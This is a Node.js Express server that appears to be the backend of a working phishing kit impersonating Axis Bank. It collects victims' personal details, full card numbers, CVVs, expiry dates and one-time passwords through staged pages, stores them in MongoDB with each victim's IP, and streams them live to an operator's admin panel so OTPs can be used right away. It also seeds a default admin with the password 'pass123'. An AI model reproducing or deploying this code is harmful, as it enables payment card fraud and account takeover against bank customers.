require('dotenv').config();
const express = require('express');
const cors = require('cors');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const { MongoClient, ObjectId } = require('mongodb');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = process.env.DB_NAME || 'axisbank';
const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret';
const SESSION_TTL_MS = 1000 * 60 * 60 * 8;
// When the pages are served from Firebase Hosting but the API runs here (Render),
// the admin session cookie is cross-site. Browsers then require SameSite=None; Secure.
const CROSS_SITE_COOKIES = process.env.CROSS_SITE_COOKIES === 'true';

// MongoDB-backed session store (reuses the project's mongodb driver).
// Avoids express-session's in-memory MemoryStore, which is not production-safe.
class MongoSessionStore extends session.Store {
  constructor({ getDb, collectionName = 'sessions', ttlMs = SESSION_TTL_MS }) {
    super();
    this.getDb = getDb;
    this.collectionName = collectionName;
    this.ttlMs = ttlMs;
  }
  collection() {
    const db = this.getDb();
    if (!db) throw new Error('Session store: database not ready.');
    return db.collection(this.collectionName);
  }
  expiry(sess) {
    const cookieExpires = sess && sess.cookie && sess.cookie.expires;
    const ms = cookieExpires ? new Date(cookieExpires).getTime() - Date.now() : this.ttlMs;
    return new Date(Date.now() + Math.max(ms, 0));
  }
  get(sid, cb) {
    this.collection().findOne({ _id: sid })
      .then((doc) => {
        if (!doc) return cb(null, null);
        if (doc.expires && new Date(doc.expires).getTime() < Date.now()) {
          return this.collection().deleteOne({ _id: sid }).then(() => cb(null, null)).catch(() => cb(null, null));
        }
        cb(null, doc.session);
      })
      .catch((e) => cb(e));
  }
  set(sid, sess, cb) {
    const doc = { _id: sid, session: sess, expires: this.expiry(sess) };
    this.collection().updateOne({ _id: sid }, { $set: doc }, { upsert: true })
      .then(() => cb && cb(null))
      .catch((e) => cb && cb(e));
  }
  touch(sid, sess, cb) {
    this.collection().updateOne({ _id: sid }, { $set: { expires: this.expiry(sess) } })
      .then(() => cb && cb(null))
      .catch((e) => cb && cb(e));
  }
  destroy(sid, cb) {
    this.collection().deleteOne({ _id: sid })
      .then(() => cb && cb(null))
      .catch((e) => cb && cb(e));
  }
  clear(cb) {
    this.collection().deleteMany({})
      .then(() => cb && cb(null))
      .catch((e) => cb && cb(e));
  }
  length(cb) {
    this.collection().countDocuments()
      .then((n) => cb(null, n))
      .catch((e) => cb(e));
  }
}

let db;
const sessionStore = new MongoSessionStore({ getDb: () => db });

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use(session({
  name: 'axis_admin_sid',
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: sessionStore,
  cookie: {
    httpOnly: true,
    sameSite: CROSS_SITE_COOKIES ? 'none' : 'lax',
    secure: CROSS_SITE_COOKIES,
    maxAge: SESSION_TTL_MS
  }
}));

app.use(express.static(path.join(__dirname, 'public')));

const clients = new Set();
const recentSubmits = new Map();

const REQUIRED_FIELDS = {
  personal: ['full_name', 'mobile', 'email', 'dob'],
  card: ['card_holder', 'card_number', 'card_expiry', 'card_cvv'],
  otp: ['otp']
};

const OPTIONAL_FIELDS = {
  card: ['total_limit', 'avail_limit']
};

function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return req.ip || req.connection.remoteAddress || '';
}

function isBlank(v) {
  return v === undefined || v === null || String(v).trim() === '';
}

function requireAuth(req, res, next) {
  if (req.session && req.session.adminId) return next();
  return res.status(401).json({ error: 'Unauthorized' });
}

const PUBLIC_DIR = path.join(__dirname, 'public');
app.get('/', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.htm')));
app.get('/apply', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'apply.htm')));
app.get('/card', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'card.htm')));
app.get('/otp', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'otp.htm')));
app.get('/admin', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'admin.html')));

app.get('/ping', (req, res) => res.send('hello world'));

app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body || {};
    if (isBlank(username) || isBlank(password)) {
      return res.status(400).json({ error: 'Username and password are required.' });
    }
    const admin = await db.collection('admins').findOne({ username: String(username).trim() });
    if (!admin) return res.status(401).json({ error: 'Invalid credentials.' });
    const ok = await bcrypt.compare(String(password), admin.passwordHash);
    if (!ok) return res.status(401).json({ error: 'Invalid credentials.' });
    req.session.adminId = admin._id.toString();
    req.session.adminUsername = admin.username;
    res.json({ ok: true, username: admin.username });
  } catch (e) {
    console.error('login error', e);
    res.status(500).json({ error: 'Server error.' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get('/api/auth/me', (req, res) => {
  if (req.session && req.session.adminId) {
    return res.json({ username: req.session.adminUsername });
  }
  res.status(401).json({ error: 'Unauthorized' });
});

app.post('/api/submit', async (req, res) => {
  try {
    const { sessionId, step, data } = req.body || {};
    if (!sessionId || typeof sessionId !== 'string') {
      return res.status(400).json({ error: 'Missing session id.' });
    }
    if (!['personal', 'card', 'otp'].includes(step)) {
      return res.status(400).json({ error: 'Invalid step.' });
    }
    const required = REQUIRED_FIELDS[step];
    const cleaned = {};
    for (const key of required) {
      const val = data ? data[key] : undefined;
      if (isBlank(val)) {
        return res.status(400).json({ error: `Missing required field: ${key}` });
      }
      cleaned[key] = String(val).trim();
    }
    for (const key of (OPTIONAL_FIELDS[step] || [])) {
      const val = data ? data[key] : undefined;
      if (!isBlank(val)) cleaned[key] = String(val).trim();
    }
    cleaned.ip = getClientIp(req);

    const dedupKey = `${sessionId}:${step}`;
    const now = Date.now();
    const last = recentSubmits.get(dedupKey) || 0;
    if (now - last < 3000) {
      return res.status(429).json({ error: 'Duplicate submission ignored.' });
    }
    recentSubmits.set(dedupKey, now);

    const ts = new Date();
    const update = {
      $set: { [`${step}`]: cleaned, updatedAt: ts },
      $setOnInsert: { sessionId, createdAt: ts }
    };
    const result = await db.collection('submissions').findOneAndUpdate(
      { sessionId },
      update,
      { upsert: true, returnDocument: 'after' }
    );

    const doc = result.value || result;
    broadcast({ type: 'submission', data: doc });

    res.json({ ok: true, sessionId });
  } catch (e) {
    console.error('submit error', e);
    res.status(500).json({ error: 'Server error.' });
  }
});

app.get('/api/submissions', requireAuth, async (req, res) => {
  try {
    const list = await db.collection('submissions')
      .find({})
      .sort({ updatedAt: -1 })
      .limit(500)
      .toArray();
    res.json(list);
  } catch (e) {
    res.status(500).json({ error: 'Server error.' });
  }
});

app.get('/api/submissions/stream', requireAuth, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  clients.add(res);

  db.collection('submissions')
    .find({})
    .sort({ updatedAt: -1 })
    .limit(500)
    .toArray()
    .then((list) => {
      res.write(`data: ${JSON.stringify({ type: 'init', data: list })}\n\n`);
    })
    .catch(() => {});

  const heartbeat = setInterval(() => {
    res.write(': hb\n\n');
  }, 25000);

  req.on('close', () => {
    clearInterval(heartbeat);
    clients.delete(res);
  });
});

function broadcast(msg) {
  const payload = `data: ${JSON.stringify(msg)}\n\n`;
  for (const c of clients) {
    try { c.write(payload); } catch (_) {}
  }
}

app.get('/api/admins', requireAuth, async (req, res) => {
  try {
    const list = await db.collection('admins')
      .find({}, { projection: { passwordHash: 0 } })
      .sort({ createdAt: 1 })
      .toArray();
    res.json(list);
  } catch (e) {
    res.status(500).json({ error: 'Server error.' });
  }
});

app.post('/api/admins', requireAuth, async (req, res) => {
  try {
    const { username, password } = req.body || {};
    if (isBlank(username) || isBlank(password)) {
      return res.status(400).json({ error: 'Username and password are required.' });
    }
    const uname = String(username).trim();
    const existing = await db.collection('admins').findOne({ username: uname });
    if (existing) return res.status(409).json({ error: 'Username already exists.' });
    const hash = await bcrypt.hash(String(password), 10);
    const r = await db.collection('admins').insertOne({
      username: uname,
      passwordHash: hash,
      createdAt: new Date()
    });
    res.json({ ok: true, id: r.insertedId, username: uname });
  } catch (e) {
    res.status(500).json({ error: 'Server error.' });
  }
});

app.put('/api/admins/:id', requireAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const { username, password } = req.body || {};
    const update = {};
    if (!isBlank(username)) update.username = String(username).trim();
    if (!isBlank(password)) update.passwordHash = await bcrypt.hash(String(password), 10);
    if (Object.keys(update).length === 0) {
      return res.status(400).json({ error: 'Nothing to update.' });
    }
    if (update.username) {
      const dup = await db.collection('admins').findOne({ username: update.username, _id: { $ne: new ObjectId(id) } });
      if (dup) return res.status(409).json({ error: 'Username already exists.' });
    }
    await db.collection('admins').updateOne({ _id: new ObjectId(id) }, { $set: update });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Server error.' });
  }
});

app.delete('/api/admins/:id', requireAuth, async (req, res) => {
  try {
    const { id } = req.params;
    if (id === req.session.adminId) {
      return res.status(400).json({ error: 'You cannot delete your own account.' });
    }
    await db.collection('admins').deleteOne({ _id: new ObjectId(id) });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Server error.' });
  }
});

async function seedDefaultAdmin() {
  const username = process.env.DEFAULT_ADMIN_USERNAME || 'user1';
  const password = process.env.DEFAULT_ADMIN_PASSWORD || 'pass123';
  const existing = await db.collection('admins').findOne({ username });
  if (!existing) {
    const hash = await bcrypt.hash(password, 10);
    await db.collection('admins').insertOne({
      username,
      passwordHash: hash,
      createdAt: new Date()
    });
    console.log(`Seeded default admin: ${username}`);
  } else {
    console.log(`Default admin ${username} already exists.`);
  }
}

async function main() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  db = client.db(DB_NAME);
  console.log(`Connected to MongoDB. DB: ${DB_NAME}`);
  await db.collection('sessions').createIndex({ expires: 1 }, { expireAfterSeconds: 0 });
  await seedDefaultAdmin();
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin`);
  });
}

main().catch((e) => {
  console.error('Failed to start server:', e);
  process.exit(1);
});
